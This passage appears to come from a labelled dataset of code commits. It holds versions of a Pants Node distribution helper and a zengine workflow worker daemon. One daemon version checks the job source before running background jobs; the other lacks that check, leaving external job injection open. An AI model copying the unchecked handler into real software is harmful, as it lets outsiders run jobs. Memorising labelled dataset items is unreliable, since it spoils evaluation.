    options_scope = 'node-distribution'

    @classmethod
    def subsystem_dependencies(cls):
      return (BinaryUtil.Factory,)

    @classmethod
    def register_options(cls, register):
      super(NodeDistribution.Factory, cls).register_options(register)
      register('--supportdir', advanced=True, default='bin/node',
               help='Find the Node distributions under this dir.  Used as part of the path to '
                    'lookup the distribution with --binary-util-baseurls and --pants-bootstrapdir')
      register('--version', advanced=True, default='6.9.1',
               help='Node distribution version.  Used as part of the path to lookup the '
                    'distribution with --binary-util-baseurls and --pants-bootstrapdir')
      register('--package-manager', advanced=True, default='npm', fingerprint=True,
               choices=NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys(),
               help='Default package manager config for repo. Should be one of {}'.format(
                 NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys()))
      register('--yarnpkg-version', advanced=True, default='v0.19.1', fingerprint=True,
               help='Yarnpkg version. Used for binary utils')

    def create(self):
      # NB: create is an instance method to allow the user to choose global or scoped.
      # It's not unreasonable to imagine multiple Node versions in play; for example: when
      # transitioning from the 0.10.x series to the 0.12.x series.
      binary_util = BinaryUtil.Factory.create()
      options = self.get_options()
      return NodeDistribution(
        binary_util, options.supportdir, options.version,
        package_manager=options.package_manager,
        yarnpkg_version=options.yarnpkg_version)

  PACKAGE_MANAGER_NPM = 'npm'
  PACKAGE_MANAGER_YARNPKG = 'yarnpkg'
  VALID_PACKAGE_MANAGER_LIST = {
    'npm': PACKAGE_MANAGER_NPM,
    'yarn': PACKAGE_MANAGER_YARNPKG
  }

  @classmethod
  def validate_package_manager(cls, package_manager):
    if package_manager not in cls.VALID_PACKAGE_MANAGER_LIST.keys():
      raise TaskError('Unknown package manager: %s' % package_manager)
    package_manager = cls.VALID_PACKAGE_MANAGER_LIST[package_manager]
    return package_manager

  @classmethod
  def _normalize_version(cls, version):
    # The versions reported by node and embedded in distribution package names are 'vX.Y.Z' and not
    # 'X.Y.Z'.
    return version if version.startswith('v') else 'v' + version

  def __init__(self, binary_util, supportdir, version, package_manager, yarnpkg_version):
    self._binary_util = binary_util
    self._supportdir = supportdir
    self._version = self._normalize_version(version)
    self.package_manager = self.validate_package_manager(package_manager=package_manager)
    self.yarnpkg_version = self._normalize_version(version=yarnpkg_version)
    logger.debug('Node.js version: %s package manager from config: %s',
                 self._version, package_manager)

  @property
  def version(self):
    """"""Returns the version of the Node distribution.

    :returns: The Node distribution version number string.
    :rtype: string
    """"""
    return self._version

  def unpack_package(self, supportdir, version, filename):
    tarball_filepath = self._binary_util.select_binary(
      supportdir=supportdir, version=version, name=filename)
    logger.debug('Tarball for %s(%s): %s', supportdir, version, tarball_filepath)
    work_dir = os.path.dirname(tarball_filepath)
    TGZ.extract(tarball_filepath, work_dir)
    return work_dir

  @memoized_method
  def install_node(self):
    """"""Install the Node distribution from pants support binaries.

    :returns: The Node distribution bin path.
    :rtype: string
    """"""
    node_package_path = self.unpack_package(
      supportdir=self._supportdir, version=self.version, filename='node.tar.gz')
    # Todo: https://github.com/pantsbuild/pants/issues/4431
    # This line depends on repacked node distribution.
    # Should change it from 'node/bin' to 'dist/bin'
    node_bin_path = os.path.join(node_package_path, 'node', 'bin')
    return node_bin_path

  @memoized_method
  def install_yarnpkg(self):
    """"""Install the Yarnpkg distribution from pants support binaries.

    :returns: The Yarnpkg distribution bin path.
    :rtype: string
    """"""
    yarnpkg_package_path = self.unpack_package(
      supportdir='bin/yarnpkg', version=self.yarnpkg_version, filename='yarnpkg.tar.gz')
    yarnpkg_bin_path = os.path.join(yarnpkg_package_path, 'dist', 'bin')
    return yarnpkg_bin_path

  class Command(namedtuple('Command', ['executable', 'args', 'extra_paths'])):
    """"""Describes a command to be run using a Node distribution.""""""

    @property
    def cmd(self):
      """"""The command line that will be executed when this command is spawned.

      :returns: The full command line used to spawn this command as a list of strings.
      :rtype: list
      """"""
      return [self.executable] + (self.args or [])

    def _prepare_env(self, kwargs):
      """"""Returns a modifed copy of kwargs['env'], and a copy of kwargs with 'env' removed.

      If there is no 'env' field in the kwargs, os.environ.copy() is used.
      env['PATH'] is set/modified to contain the Node distribution's bin directory at the front.

      :param kwargs: The original kwargs.
      :returns: An (env, kwargs) tuple containing the modified env and kwargs copies.
      :rtype: (dict, dict)
      """"""
      kwargs = kwargs.copy()
      env = kwargs.pop('env', os.environ).copy()
      env['PATH'] = os.path.pathsep.join(self.extra_paths + [env.get('PATH', '')])
      return env, kwargs

    def run(self, **kwargs):
      """"""Runs this command.

      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.
      :returns: A handle to the running command.
      :rtype: :class:`subprocess.Popen`
      """"""
      env, kwargs = self._prepare_env(kwargs)
      return subprocess.Popen(self.cmd, env=env, **kwargs)

    def check_output(self, **kwargs):
      """"""Runs this command returning its captured stdout.

      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.
      :returns: The captured standard output stream of the command.
      :rtype: string
      :raises: :class:`subprocess.CalledProcessError` if the command fails.
      """"""
      env, kwargs = self._prepare_env(kwargs)
      return subprocess.check_output(self.cmd, env=env, **kwargs)

    def __str__(self):
      return ' '.join(self.cmd)

  def node_command(self, args=None):
    """"""Creates a command that can run `node`, passing the given args to it.

    :param list args: An optional list of arguments to pass to `node`.
    :returns: A `node` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    # NB: We explicitly allow no args for the `node` command unlike the `npm` command since running
    # `node` with no arguments is useful, it launches a REPL.
    node_bin_path = self.install_node()
    return self.Command(
      executable=os.path.join(node_bin_path, 'node'), args=args,
      extra_paths=[node_bin_path])

  def npm_command(self, args):
    """"""Creates a command that can run `npm`, passing the given args to it.

    :param list args: A list of arguments to pass to `npm`.
    :returns: An `npm` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    node_bin_path = self.install_node()
    return self.Command(
      executable=os.path.join(node_bin_path, 'npm'), args=args,
      extra_paths=[node_bin_path])

  def yarnpkg_command(self, args):
    """"""Creates a command that can run `yarnpkg`, passing the given args to it.

    :param list args: A list of arguments to pass to `yarnpkg`.
    :returns: An `yarnpkg` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    node_bin_path = self.install_node()
    yarnpkg_bin_path = self.install_yarnpkg()
    return self.Command(
      executable=os.path.join(yarnpkg_bin_path, 'yarnpkg'), args=args,
      extra_paths=[yarnpkg_bin_path, node_bin_path])
/n/n/ncontrib/node/tests/python/pants_test/contrib/node/subsystems/test_node_distribution.py/n/n# coding=utf-8
# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import (absolute_import, division, generators, nested_scopes, print_function,
                        unicode_literals, with_statement)

import json
import os
import subprocess
import unittest

from pants_test.subsystem.subsystem_util import global_subsystem_instance

from pants.contrib.node.subsystems.node_distribution import NodeDistribution


class NodeDistributionTest(unittest.TestCase):

  def setUp(self):
    self.distribution = global_subsystem_instance(NodeDistribution.Factory).create()

  def test_bootstrap(self):
    node_cmd = self.distribution.node_command(args=['--version'])
    output = node_cmd.check_output()
    self.assertEqual(self.distribution.version, output.strip())

  def test_node(self):
    node_command = self.distribution.node_command(args=['--interactive'])  # Force a REPL session.
    repl = node_command.run(stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    out, err = repl.communicate('console.log(""Hello World!"")')
    self.assertEqual('', err)
    self.assertEqual(0, repl.returncode)

    for line in out.splitlines():
      if line.endswith('Hello World!'):
        break
    else:
      self.fail('Did not find the expected ""Hello World!"" in the REPL session '
                'output:\n{}'.format(out))

  def test_npm(self):
    npm_version_flag = self.distribution.npm_command(args=['--version'])
    raw_version = npm_version_flag.check_output().strip()

    npm_version_cmd = self.distribution.npm_command(args=['version', '--json'])
    versions_json = npm_version_cmd.check_output()
    versions = json.loads(versions_json)

    self.assertEqual(raw_version, versions['npm'])

  def test_yarnpkg(self):
    yarnpkg_version_command = self.distribution.yarnpkg_command(args=['--version'])
    yarnpkg_version = yarnpkg_version_command.check_output().strip()
    yarnpkg_versions_command = self.distribution.yarnpkg_command(args=['versions', '--json'])
    yarnpkg_versions = json.loads(yarnpkg_versions_command.check_output())
    self.assertEqual(yarnpkg_version, yarnpkg_versions['data']['yarn'])

  def test_node_command_path_injection(self):
    node_bin_path = self.distribution.install_node()
    node_path_cmd = self.distribution.node_command(
      args=['--eval', 'console.log(process.env[""PATH""])'])

    # Test the case in which we do not pass in env,
    # which should fall back to env=os.environ.copy()
    injected_paths = node_path_cmd.check_output().strip().split(os.pathsep)
    self.assertEqual(node_bin_path, injected_paths[0])

  def test_node_command_path_injection_with_overrided_path(self):
    node_bin_path = self.distribution.install_node()
    node_path_cmd = self.distribution.node_command(
      args=['--eval', 'console.log(process.env[""PATH""])'])
    injected_paths = node_path_cmd.check_output(
      env={'PATH': '/test/path'}
    ).strip().split(os.pathsep)
    self.assertEqual(node_bin_path, injected_paths[0])
    self.assertListEqual([node_bin_path, '/test/path'], injected_paths)

  def test_node_command_path_injection_with_empty_path(self):
    node_bin_path = self.distribution.install_node()
    node_path_cmd = self.distribution.node_command(
      args=['--eval', 'console.log(process.env[""PATH""])'])
    injected_paths = node_path_cmd.check_output(
      env={'PATH': ''}
    ).strip().split(os.pathsep)
    self.assertListEqual([node_bin_path, ''], injected_paths)
/n/n/n",0
191,191,b3683453b29eba54aca6d04cd8a717429257c0fc,"/contrib/node/src/python/pants/contrib/node/subsystems/node_distribution.py/n/n# coding=utf-8
# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import (absolute_import, division, generators, nested_scopes, print_function,
                        unicode_literals, with_statement)

import logging
import os
import subprocess
from collections import namedtuple

from pants.base.exceptions import TaskError
from pants.binaries.binary_util import BinaryUtil
from pants.fs.archive import TGZ
from pants.subsystem.subsystem import Subsystem
from pants.util.contextutil import temporary_dir
from pants.util.memo import memoized_property


logger = logging.getLogger(__name__)


class NodeDistribution(object):
  """"""Represents a self-bootstrapping Node distribution.""""""

  class Factory(Subsystem):
    options_scope = 'node-distribution'

    @classmethod
    def subsystem_dependencies(cls):
      return (BinaryUtil.Factory,)

    @classmethod
    def register_options(cls, register):
      super(NodeDistribution.Factory, cls).register_options(register)
      register('--supportdir', advanced=True, default='bin/node',
               help='Find the Node distributions under this dir.  Used as part of the path to '
                    'lookup the distribution with --binary-util-baseurls and --pants-bootstrapdir')
      register('--version', advanced=True, default='6.9.1',
               help='Node distribution version.  Used as part of the path to lookup the '
                    'distribution with --binary-util-baseurls and --pants-bootstrapdir')
      register('--package-manager', advanced=True, default='npm', fingerprint=True,
               choices=NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys(),
               help='Default package manager config for repo. Should be one of {}'.format(
                 NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys()))
      register('--yarnpkg-version', advanced=True, default='v0.19.1', fingerprint=True,
               help='Yarnpkg version. Used for binary utils')

    def create(self):
      # NB: create is an instance method to allow the user to choose global or scoped.
      # It's not unreasonable to imagine multiple Node versions in play; for example: when
      # transitioning from the 0.10.x series to the 0.12.x series.
      binary_util = BinaryUtil.Factory.create()
      options = self.get_options()
      return NodeDistribution(
        binary_util, options.supportdir, options.version,
        package_manager=options.package_manager,
        yarnpkg_version=options.yarnpkg_version)

  PACKAGE_MANAGER_NPM = 'npm'
  PACKAGE_MANAGER_YARNPKG = 'yarnpkg'
  VALID_PACKAGE_MANAGER_LIST = {
    'npm': PACKAGE_MANAGER_NPM,
    'yarn': PACKAGE_MANAGER_YARNPKG
  }

  @classmethod
  def validate_package_manager(cls, package_manager):
    if package_manager not in cls.VALID_PACKAGE_MANAGER_LIST.keys():
      raise TaskError('Unknown package manager: %s' % package_manager)
    package_manager = cls.VALID_PACKAGE_MANAGER_LIST[package_manager]
    return package_manager

  @classmethod
  def _normalize_version(cls, version):
    # The versions reported by node and embedded in distribution package names are 'vX.Y.Z' and not
    # 'X.Y.Z'.
    return version if version.startswith('v') else 'v' + version

  def __init__(self, binary_util, relpath, version, package_manager, yarnpkg_version):
    self._binary_util = binary_util
    self._relpath = relpath
    self._version = self._normalize_version(version)
    self.package_manager = self.validate_package_manager(package_manager=package_manager)
    self.yarnpkg_version = self._normalize_version(version=yarnpkg_version)
    logger.debug('Node.js version: %s package manager from config: %s',
                 self._version, package_manager)

  @property
  def version(self):
    """"""Returns the version of the Node distribution.

    :returns: The Node distribution version number string.
    :rtype: string
    """"""
    return self._version

  def get_binary_path_from_tgz(self, supportdir, version, filename, inpackage_path):
    tarball_filepath = self._binary_util.select_binary(
      supportdir=supportdir, version=version, name=filename)
    logger.debug('Tarball for %s(%s): %s', supportdir, version, tarball_filepath)
    work_dir = os.path.dirname(tarball_filepath)
    unpacked_dir = os.path.join(work_dir, 'unpacked')
    if not os.path.exists(unpacked_dir):
      with temporary_dir(root_dir=work_dir) as tmp_dist:
        TGZ.extract(tarball_filepath, tmp_dist)
        os.rename(tmp_dist, unpacked_dir)
    binary_path = os.path.join(unpacked_dir, inpackage_path)
    return binary_path

  @memoized_property
  def path(self):
    """"""Returns the root path of this node distribution.

    :returns: The Node distribution root path.
    :rtype: string
    """"""
    node_path = self.get_binary_path_from_tgz(
      supportdir=self._relpath, version=self.version, filename='node.tar.gz',
      inpackage_path='node')
    logger.debug('Node path: %s', node_path)
    return node_path

  @memoized_property
  def yarnpkg_path(self):
    """"""Returns the root path of yarnpkg distribution.

    :returns: The yarnpkg root path.
    :rtype: string
    """"""
    yarnpkg_path = self.get_binary_path_from_tgz(
      supportdir='bin/yarnpkg', version=self.yarnpkg_version, filename='yarnpkg.tar.gz',
      inpackage_path='dist')
    logger.debug('Yarnpkg path: %s', yarnpkg_path)
    return yarnpkg_path

  class Command(namedtuple('Command', ['bin_dir_path', 'executable', 'args'])):
    """"""Describes a command to be run using a Node distribution.""""""

    @property
    def cmd(self):
      """"""The command line that will be executed when this command is spawned.

      :returns: The full command line used to spawn this command as a list of strings.
      :rtype: list
      """"""
      return [os.path.join(self.bin_dir_path, self.executable)] + self.args

    def _prepare_env(self, kwargs):
      """"""Returns a modifed copy of kwargs['env'], and a copy of kwargs with 'env' removed.

      If there is no 'env' field in the kwargs, os.environ.copy() is used.
      env['PATH'] is set/modified to contain the Node distribution's bin directory at the front.

      :param kwargs: The original kwargs.
      :returns: An (env, kwargs) tuple containing the modified env and kwargs copies.
      :rtype: (dict, dict)
      """"""
      kwargs = kwargs.copy()
      env = kwargs.pop('env', os.environ).copy()
      env['PATH'] = (self.bin_dir_path + os.path.pathsep + env['PATH']
                     if env.get('PATH', '') else self.bin_dir_path)
      return env, kwargs

    def run(self, **kwargs):
      """"""Runs this command.

      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.
      :returns: A handle to the running command.
      :rtype: :class:`subprocess.Popen`
      """"""
      env, kwargs = self._prepare_env(kwargs)
      return subprocess.Popen(self.cmd, env=env, **kwargs)

    def check_output(self, **kwargs):
      """"""Runs this command returning its captured stdout.

      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.
      :returns: The captured standard output stream of the command.
      :rtype: string
      :raises: :class:`subprocess.CalledProcessError` if the command fails.
      """"""
      env, kwargs = self._prepare_env(kwargs)
      return subprocess.check_output(self.cmd, env=env, **kwargs)

    def __str__(self):
      return ' '.join(self.cmd)

  def node_command(self, args=None):
    """"""Creates a command that can run `node`, passing the given args to it.

    :param list args: An optional list of arguments to pass to `node`.
    :returns: A `node` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    # NB: We explicitly allow no args for the `node` command unlike the `npm` command since running
    # `node` with no arguments is useful, it launches a REPL.
    return self._create_command('node', args)

  def npm_command(self, args):
    """"""Creates a command that can run `npm`, passing the given args to it.

    :param list args: A list of arguments to pass to `npm`.
    :returns: An `npm` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    return self._create_command('npm', args)

  def yarnpkg_command(self, args):
    """"""Creates a command that can run `yarnpkg`, passing the given args to it.

    :param list args: A list of arguments to pass to `yarnpkg`.
    :returns: An `yarnpkg` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    return self.Command(
      bin_dir_path=os.path.join(self.yarnpkg_path, 'bin'), executable='yarnpkg', args=args or [])

  def _create_command(self, executable, args=None):
    return self.Command(os.path.join(self.path, 'bin'), executable, args or [])
/n/n/n",1
30,30,52eafbee90f8ddf78be0c7452828d49423246851,"zengine/wf_daemon.py/n/n#!/usr/bin/env python
""""""
workflow worker daemon
""""""
import json
import traceback
from pprint import pformat

import signal
from time import sleep, time

import pika
from tornado.escape import json_decode

from pyoko.conf import settings
from pyoko.lib.utils import get_object_from_path
from zengine.client_queue import ClientQueue, BLOCKING_MQ_PARAMS
from zengine.engine import ZEngine
from zengine.current import Current
from zengine.lib.cache import Session, KeepAlive
from zengine.lib.exceptions import HTTPError, SecurityInfringementAttempt
from zengine.log import log
import sys
# receivers should be imported at right time, right place
# they will not registered if not placed in a central location
# but they can cause ""cannot import settings"" errors if imported too early
from zengine.receivers import *

sys._zops_wf_state_log = ''

wf_engine = ZEngine()

LOGIN_REQUIRED_MESSAGE = {'error': ""Login required"", ""code"": 401}


class Worker(object):
    """"""
    Workflow runner worker object
    """"""
    INPUT_QUEUE_NAME = 'in_queue'
    INPUT_EXCHANGE = 'input_exc'

    def __init__(self):
        self.connect()
        signal.signal(signal.SIGTERM, self.exit)
        log.info(""Worker starting"")

    def exit(self, signal=None, frame=None):
        """"""
        Properly close the AMQP connections
        """"""
        self.input_channel.close()
        self.client_queue.close()
        self.connection.close()
        log.info(""Worker exiting"")
        sys.exit(0)

    def connect(self):
        """"""
        make amqp connection and create channels and queue binding
        """"""
        self.connection = pika.BlockingConnection(BLOCKING_MQ_PARAMS)
        self.client_queue = ClientQueue()
        self.input_channel = self.connection.channel()

        self.input_channel.exchange_declare(exchange=self.INPUT_EXCHANGE,
                                            type='topic',
                                            durable=True)
        self.input_channel.queue_declare(queue=self.INPUT_QUEUE_NAME)
        self.input_channel.queue_bind(exchange=self.INPUT_EXCHANGE, queue=self.INPUT_QUEUE_NAME)
        log.info(""Bind to queue named '%s' queue with exchange '%s'"" % (self.INPUT_QUEUE_NAME,
                                                                        self.INPUT_EXCHANGE))

    def run(self):
        """"""
        actual consuming of incoming works starts here
        """"""
        self.input_channel.basic_consume(self.handle_message,
                                         queue=self.INPUT_QUEUE_NAME,
                                         no_ack=True)
        try:
            self.input_channel.start_consuming()
        except (KeyboardInterrupt, SystemExit):
            log.info("" Exiting"")
            self.exit()

    def _prepare_error_msg(self, msg):
        try:
            return \
                msg + '\n\n' + \
                ""INPUT DATA: %s\n\n"" % pformat(self.current.input) + \
                ""OUTPUT DATA: %s\n\n"" % pformat(self.current.output) + \
                sys._zops_wf_state_log
        except:
            return msg

    def _handle_ping_pong(self, data, session):

        still_alive = KeepAlive(sess_id=session.sess_id).update_or_expire_session()
        msg = {'msg': 'pong'}
        if not still_alive:
            msg.update(LOGIN_REQUIRED_MESSAGE)
        return msg

    def _handle_job(self, session, data, headers):
        # security check for preventing external job execution attempts
        if headers['source'] != 'Internal':
            raise SecurityInfringementAttempt(
                ""Someone ({user}) from {ip} tried to inject a job {job}"".format(user=session['user_id'], ip=headers['remote_ip'], job=data['job']))
        self.current = Current(session=session, input=data)
        self.current.headers = headers
        # import method
        method = get_object_from_path(settings.BG_JOBS[data['job']])
        # call view with current object
        method(self.current)

    def _handle_view(self, session, data, headers):
        # create Current object
        self.current = Current(session=session, input=data)
        self.current.headers = headers

        # handle ping/pong/session expiration
        if data['view'] == 'ping':
            return self._handle_ping_pong(data, session)

        # handle authentication
        if not (self.current.is_auth or data['view'] in settings.ANONYMOUS_WORKFLOWS):
            return LOGIN_REQUIRED_MESSAGE

        # import view
        view = get_object_from_path(settings.VIEW_URLS[data['view']])

        # call view with current object
        view(self.current)

        # return output
        return self.current.output

    def _handle_workflow(self, session, data, headers):
        wf_engine.start_engine(session=session, input=data, workflow_name=data['wf'])
        wf_engine.current.headers = headers
        self.current = wf_engine.current
        wf_engine.run()
        # if self.connection.is_closed:
        #     log.info(""Connection is closed, re-opening..."")
        #     self.connect()
        return wf_engine.current.output

    def handle_message(self, ch, method, properties, body):
        """"""
        this is a pika.basic_consumer callback
        handles client inputs, runs appropriate workflows and views

        Args:
            ch: amqp channel
            method: amqp method
            properties:
            body: message body
        """"""
        input = {}
        headers = {}
        try:
            self.sessid = method.routing_key

            input = json_decode(body)
            data = input['data']

            # since this comes as ""path"" we dont know if it's view or workflow yet
            # TODO: just a workaround till we modify ui to
            if 'path' in data:
                if data['path'] in settings.VIEW_URLS:
                    data['view'] = data['path']
                else:
                    data['wf'] = data['path']
            session = Session(self.sessid)

            headers = {'remote_ip': input['_zops_remote_ip'],
                       'source': input['_zops_source']}

            if 'wf' in data:
                output = self._handle_workflow(session, data, headers)
            elif 'job' in data:

                self._handle_job(session, data, headers)
                return
            else:
                output = self._handle_view(session, data, headers)

        except HTTPError as e:
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            output = {'cmd': 'error', 'error': self._prepare_error_msg(e.message), ""code"": e.code}
            log.exception(""Http error occurred"")
        except:
            self.current = Current(session=session, input=data)
            self.current.headers = headers
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            err = traceback.format_exc()
            output = {'error': self._prepare_error_msg(err), ""code"": 500}
            log.exception(""Worker error occurred with messsage body:\n%s"" % body)
        if 'callbackID' in input:
            output['callbackID'] = input['callbackID']
        log.info(""OUTPUT for %s: %s"" % (self.sessid, output))
        output['reply_timestamp'] = time()
        self.send_output(output)

    def send_output(self, output):
        # TODO: This is ugly, we should separate login process
        # log.debug(""SEND_OUTPUT: %s"" % output)
        if self.current.user_id is None or 'login_process' in output:
            self.client_queue.send_to_default_exchange(self.sessid, output)
        else:
            self.client_queue.send_to_prv_exchange(self.current.user_id, output)


def run_workers(no_subprocess, watch_paths=None, is_background=False):
    """"""
    subprocess handler
    """"""
    import atexit, os, subprocess, signal
    if watch_paths:
        from watchdog.observers import Observer
        # from watchdog.observers.fsevents import FSEventsObserver as Observer
        # from watchdog.observers.polling import PollingObserver as Observer
        from watchdog.events import FileSystemEventHandler

    def on_modified(event):
        if not is_background:
            print(""Restarting worker due to change in %s"" % event.src_path)
        log.info(""modified %s"" % event.src_path)
        try:
            kill_children()
            run_children()
        except:
            log.exception(""Error while restarting worker"")

    handler = FileSystemEventHandler()
    handler.on_modified = on_modified

    # global child_pids
    child_pids = []
    log.info(""starting %s workers"" % no_subprocess)

    def run_children():
        global child_pids
        child_pids = []
        for i in range(int(no_subprocess)):
            proc = subprocess.Popen([sys.executable, __file__],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            child_pids.append(proc.pid)
            log.info(""Started worker with pid %s"" % proc.pid)

    def kill_children():
        """"""
        kill subprocess on exit of manager (this) process
        """"""
        log.info(""Stopping worker(s)"")
        for pid in child_pids:
            if pid is not None:
                os.kill(pid, signal.SIGTERM)

    run_children()
    atexit.register(kill_children)
    signal.signal(signal.SIGTERM, kill_children)
    if watch_paths:
        observer = Observer()
        for path in watch_paths:
            if not is_background:
                print(""Watching for changes under %s"" % path)
            observer.schedule(handler, path=path, recursive=True)
        observer.start()
    while 1:
        try:
            sleep(1)
        except KeyboardInterrupt:
            log.info(""Keyboard interrupt, exiting"")
            if watch_paths:
                observer.stop()
                observer.join()
            sys.exit(0)


if __name__ == '__main__':
    if 'manage' in str(sys.argv):
        no_subprocess = [arg.split('manage=')[-1] for arg in sys.argv if 'manage' in arg][0]
        run_workers(no_subprocess)
    else:
        worker = Worker()
        worker.run()
/n/n/n",0
31,31,52eafbee90f8ddf78be0c7452828d49423246851,"/zengine/wf_daemon.py/n/n#!/usr/bin/env python
""""""
workflow worker daemon
""""""
import json
import traceback
from pprint import pformat

import signal
from time import sleep, time

import pika
from tornado.escape import json_decode

from pyoko.conf import settings
from pyoko.lib.utils import get_object_from_path
from zengine.client_queue import ClientQueue, BLOCKING_MQ_PARAMS
from zengine.engine import ZEngine
from zengine.current import Current
from zengine.lib.cache import Session, KeepAlive
from zengine.lib.exceptions import HTTPError
from zengine.log import log
import sys
# receivers should be imported at right time, right place
# they will not registered if not placed in a central location
# but they can cause ""cannot import settings"" errors if imported too early
from zengine.receivers import *

sys._zops_wf_state_log = ''

wf_engine = ZEngine()

LOGIN_REQUIRED_MESSAGE = {'error': ""Login required"", ""code"": 401}
class Worker(object):
    """"""
    Workflow runner worker object
    """"""
    INPUT_QUEUE_NAME = 'in_queue'
    INPUT_EXCHANGE = 'input_exc'

    def __init__(self):
        self.connect()
        signal.signal(signal.SIGTERM, self.exit)
        log.info(""Worker starting"")

    def exit(self, signal=None, frame=None):
        """"""
        Properly close the AMQP connections
        """"""
        self.input_channel.close()
        self.client_queue.close()
        self.connection.close()
        log.info(""Worker exiting"")
        sys.exit(0)

    def connect(self):
        """"""
        make amqp connection and create channels and queue binding
        """"""
        self.connection = pika.BlockingConnection(BLOCKING_MQ_PARAMS)
        self.client_queue = ClientQueue()
        self.input_channel = self.connection.channel()

        self.input_channel.exchange_declare(exchange=self.INPUT_EXCHANGE,
                                            type='topic',
                                            durable=True)
        self.input_channel.queue_declare(queue=self.INPUT_QUEUE_NAME)
        self.input_channel.queue_bind(exchange=self.INPUT_EXCHANGE, queue=self.INPUT_QUEUE_NAME)
        log.info(""Bind to queue named '%s' queue with exchange '%s'"" % (self.INPUT_QUEUE_NAME,
                                                                        self.INPUT_EXCHANGE))

    def run(self):
        """"""
        actual consuming of incoming works starts here
        """"""
        self.input_channel.basic_consume(self.handle_message,
                                         queue=self.INPUT_QUEUE_NAME,
                                         no_ack=True)
        try:
            self.input_channel.start_consuming()
        except (KeyboardInterrupt, SystemExit):
            log.info("" Exiting"")
            self.exit()

    def _prepare_error_msg(self, msg):
        try:
            return \
                msg + '\n\n' + \
                ""INPUT DATA: %s\n\n"" % pformat(self.current.input) + \
                ""OUTPUT DATA: %s\n\n"" % pformat(self.current.output) + \
                sys._zops_wf_state_log
        except:
            return msg

    def _handle_ping_pong(self, data, session):

        still_alive = KeepAlive(sess_id=session.sess_id).update_or_expire_session()
        msg = {'msg': 'pong'}
        if not still_alive:
            msg.update(LOGIN_REQUIRED_MESSAGE)
        return msg

    def _handle_job(self, session, data, headers):
        self.current = Current(session=session, input=data)
        self.current.headers = headers
        # import method
        method = get_object_from_path(settings.BG_JOBS[data['job']])
        # call view with current object
        method(self.current)


    def _handle_view(self, session, data, headers):
        # create Current object
        self.current = Current(session=session, input=data)
        self.current.headers = headers

        # handle ping/pong/session expiration
        if data['view'] == 'ping':
            return self._handle_ping_pong(data, session)

        # handle authentication
        if not (self.current.is_auth or data['view'] in settings.ANONYMOUS_WORKFLOWS):
            return LOGIN_REQUIRED_MESSAGE

        # import view
        view = get_object_from_path(settings.VIEW_URLS[data['view']])

        # call view with current object
        view(self.current)

        # return output
        return self.current.output

    def _handle_workflow(self, session, data, headers):
        wf_engine.start_engine(session=session, input=data, workflow_name=data['wf'])
        wf_engine.current.headers = headers
        self.current = wf_engine.current
        wf_engine.run()
        # if self.connection.is_closed:
        #     log.info(""Connection is closed, re-opening..."")
        #     self.connect()
        return wf_engine.current.output

    def handle_message(self, ch, method, properties, body):
        """"""
        this is a pika.basic_consumer callback
        handles client inputs, runs appropriate workflows and views

        Args:
            ch: amqp channel
            method: amqp method
            properties:
            body: message body
        """"""
        input = {}
        try:
            self.sessid = method.routing_key

            input = json_decode(body)
            data = input['data']

            # since this comes as ""path"" we dont know if it's view or workflow yet
            #TODO: just a workaround till we modify ui to
            if 'path' in data:
                if data['path'] in settings.VIEW_URLS:
                    data['view'] = data['path']
                else:
                    data['wf'] = data['path']
            session = Session(self.sessid)

            headers = {'remote_ip': input['_zops_remote_ip']}

            if 'wf' in data:
                output = self._handle_workflow(session, data, headers)
            elif 'job' in data:

                self._handle_job(session, data, headers)
                return
            else:
                output = self._handle_view(session, data, headers)

        except HTTPError as e:
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            output = {'cmd': 'error', 'error': self._prepare_error_msg(e.message), ""code"": e.code}
            log.exception(""Http error occurred"")
        except:
            self.current = Current(session=session, input=data)
            self.current.headers = headers
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            err = traceback.format_exc()
            output = {'error': self._prepare_error_msg(err), ""code"": 500}
            log.exception(""Worker error occurred with messsage body:\n%s"" % body)
        if 'callbackID' in input:
            output['callbackID'] = input['callbackID']
        log.info(""OUTPUT for %s: %s"" % (self.sessid, output))
        output['reply_timestamp'] = time()
        self.send_output(output)

    def send_output(self, output):
        # TODO: This is ugly, we should separate login process
        # log.debug(""SEND_OUTPUT: %s"" % output)
        if self.current.user_id is None or 'login_process' in output:
            self.client_queue.send_to_default_exchange(self.sessid, output)
        else:
            self.client_queue.send_to_prv_exchange(self.current.user_id, output)


def run_workers(no_subprocess, watch_paths=None, is_background=False):
    """"""
    subprocess handler
    """"""
    import atexit, os, subprocess, signal
    if watch_paths:
        from watchdog.observers import Observer
        # from watchdog.observers.fsevents import FSEventsObserver as Observer
        # from watchdog.observers.polling import PollingObserver as Observer
        from watchdog.events import FileSystemEventHandler


    def on_modified(event):
        if not is_background:
            print(""Restarting worker due to change in %s"" % event.src_path)
        log.info(""modified %s"" % event.src_path)
        try:
            kill_children()
            run_children()
        except:
            log.exception(""Error while restarting worker"")

    handler = FileSystemEventHandler()
    handler.on_modified = on_modified

    # global child_pids
    child_pids = []
    log.info(""starting %s workers"" % no_subprocess)

    def run_children():
        global child_pids
        child_pids = []
        for i in range(int(no_subprocess)):
            proc = subprocess.Popen([sys.executable, __file__],
                                    stdout=subprocess.PIPE,
